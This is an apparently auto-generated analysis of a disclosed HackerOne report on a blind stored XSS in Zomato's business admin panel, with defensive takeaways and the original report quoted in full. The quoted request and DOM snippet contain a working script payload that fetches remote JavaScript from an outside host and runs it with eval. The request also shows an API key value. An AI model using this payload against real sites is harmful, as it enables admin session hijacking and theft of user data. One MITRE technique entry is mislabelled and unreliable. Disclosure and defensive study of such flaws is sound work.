# Blind Stored XSS in Zomato Business Admin Panel via Review Report Details

## Metadata
- **Source:** HackerOne
- **Report:** 314126 | https://hackerone.com/reports/314126
- **Submitted:** 2018-02-09
- **Reporter:** gerben_javado
- **Program:** Zomato
- **Bounty:** Not specified in report
- **Severity:** high
- **Vuln:** Cross-site Scripting (XSS) - Stored, Improper Input Validation, Insufficient Output Encoding
- **CVEs:** None
- **Category:** web-api

## Summary
A stored XSS vulnerability exists in the Zomato Business app's review reporting feature where user-supplied text in the 'additional_text' field is rendered as HTML without proper sanitization on the admin panel. An attacker can inject malicious JavaScript that executes in the context of admin accounts accessing the review management interface, potentially compromising admin sessions and accessing private user data.

## Attack scenario
1. Attacker identifies a review on Zomato they can report via the Business app
2. Attacker crafts a report with a JavaScript payload in the 'additional_details' field using XMLHttpRequest to bypass CSP
3. Attacker submits the report through the API endpoint with X-Access-Token authentication
4. Payload is stored in the backend database without sanitization
5. When a Zomato admin accesses the admin panel to review reports, the malicious script executes in their browser
6. Attacker's JavaScript gains access to admin session cookies and can exfiltrate user data or escalate privileges

## Root cause
The application fails to properly encode user input ('additional_text' parameter) before rendering it in HTML context on the admin panel. While CSP with unsafe-inline is present, it does not prevent inline script execution. The backend stores the payload unsanitized and the frontend renders it as trusted HTML.

## Attacker mindset
The attacker recognized that admin review of user reports is a guaranteed execution vector. By targeting the admin panel rather than end-users, they increased certainty of payload execution. The use of XMLHttpRequest with external script loading demonstrates intent to maintain obfuscation and bypass CSP restrictions through legitimate browser APIs.

## Defensive takeaways
- Implement strict input validation and sanitization for all user-supplied text fields, especially those exposed to administrative interfaces
- Apply proper output encoding (HTML entity encoding) when rendering user input in HTML context
- Use a Content Security Policy without 'unsafe-inline' and implement nonce-based script whitelisting for legitimate scripts
- Implement server-side HTML sanitization libraries (e.g., DOMPurify equivalent on backend) to strip potentially dangerous content
- Add Content Security Policy headers that block external script loading from arbitrary domains
- Perform security code review of admin panel interfaces which are high-value targets
- Implement XSS detection mechanisms and anomaly logging for admin panel access
- Use templating engines with auto-escaping enabled by default

## Variant hunting
Check other admin panel pages for similar patterns of unsanitized user input rendering (complaint forms, user feedback, support tickets)
Test other user-submitted text fields in the Merchant API for stored XSS (description, tags, images alt-text)
Examine webhook data or email notifications that may render user-supplied content
Test if other report types (restaurant, user profile, delivery issues) have the same vulnerability
Check if the vulnerability extends to customer-facing pages where admin-submitted content is displayed
Verify if the vulnerability exists in mobile app WebViews when displaying admin panels

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application (XSS in web application)
- T1566.002 - Phishing: Spearphishing Link (if admin is socially engineered to visit report)
- T1071.001 - Application Layer Protocol: Web Protocols (HTTP/HTTPS payload delivery)
- T1115 - Gatherer Information - Gather Victim Identity Information (exfiltrate user data via XSS)
- T1548 - Abuse Elevation Control Mechanism (escalate privileges via admin account compromise)

## Notes
The report demonstrates sophisticated understanding of attack surface - targeting admin panels instead of end-users increases payload execution certainty. The attacker used eval() with XMLHttpRequest to dynamically load external scripts, bypassing inline CSP restrictions. The 'blind' nature means the attacker couldn't directly observe execution but relied on logical deduction that admins would process reports. The redacted URLs and IDs suggest this was a real, verified vulnerability in production.

## Full report
<details><summary>Expand</summary>

#Introduction
In the Zomato Business app there is the functionality to report a review and give additional details as to why you did report the review. Because I knew this reason would be read by Zomato admins I did insert a blind XSS payload here, which ended up executing on https://www.zomato.com████████/reviews_new?review_id={ID}. This means that the content of additional details will be rendered as HTML on the admin panel page. The CSP policy of Zomato can be bypassed by leveraging the unsafe-inline in the CSP to load the JavaScript file using `XMLHttpRequest`.

#Steps to reproduce
1. Replace the `X-Access-Token` to your access token and the `review_id` to a review you can report.
2. Send the request in Burp
3. Go to https://www.zomato.com██████████/reviews_new?review_id={ID}
4. XSS payload executes

```http
POST /v2/█████merchant HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 485
Host: api.zomato.com
X-Zomato-API-Key: a2cf52f6036511e48be6b2227cce2b54
X-Access-Token: dc5da████████ad0fdddff04
X-Client-Id: zomato_merchantandroid_v2

reason_id=5&review_id=32288944&additional_text=<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

#Screenshot Admin Panel
{█████}

#Dom Snippet
```html
 <u>Reported by Merchant(ID)</u> : <a style="opacity: 1; color: #000000; text-decoration:underline" href="https://www.zomato.com/users/43211589">43211589</a><br><u>Report Reason ID</u> : 5 (Other (mention reason below).)<br><u>Additional Text</u> : H
H
H
H
H
''"&gt;<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

## Impact

An attacker is certain that a Zomato Admin will read his report. Thus an attacker can be sure that he can gain access to the Zomato admin panel where he can get the private information of other users by leveraging AJAX requests.

The hacker selected the **Cross-site Scripting (XSS) - Stored** weakness. This vulnerability type requires contextual information from the hacker. They provided the following answers:

**URL**
https://www.zomato.com██████████/reviews_new

**Verified**
Yes



</details>

---
*Analysed by Claude on 2026-05-12*
